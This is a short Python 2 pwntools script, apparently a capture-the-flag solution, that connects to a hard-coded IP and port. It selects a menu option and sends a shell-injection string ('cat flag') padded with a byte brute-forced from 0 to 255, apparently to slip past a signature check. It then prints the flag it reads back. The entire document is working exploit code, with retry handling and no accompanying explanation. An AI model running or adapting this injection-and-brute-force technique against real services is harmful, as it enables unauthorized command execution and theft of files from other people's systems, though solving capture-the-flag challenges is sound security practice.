from pwn import *
import sys

host = "54.202.7.144"
port = 9875

context(log_level='info')

stopword = "FLAG="
cmd = "echo -n '{}';cat flag; #".format(stopword)
for i in range(255):
    for j in range(3):
        try:
            r = remote(host, port)
            r.recvuntil(">_ ")
            r.sendline("2")
            r.recvuntil(">_ ")
            r.sendline(cmd + chr(i) * (255 - len(cmd)))
            r.recvuntil(">_ ")
            r.sendline("00")
            s = r.recvuntil(stopword, timeout=1)
            if s == "" or s.startswith("wrong signature") or s.startswith("echo"):
                raise EOFError()
            s = r.recvline()
            print "Flag is {}".format(s)
            exit()
        except EOFError:
            r.close()
            print "Next #{}".format(i)
            break
        except PwnlibException:
            r.close()
            print "Retry #{}".format(i)
            continue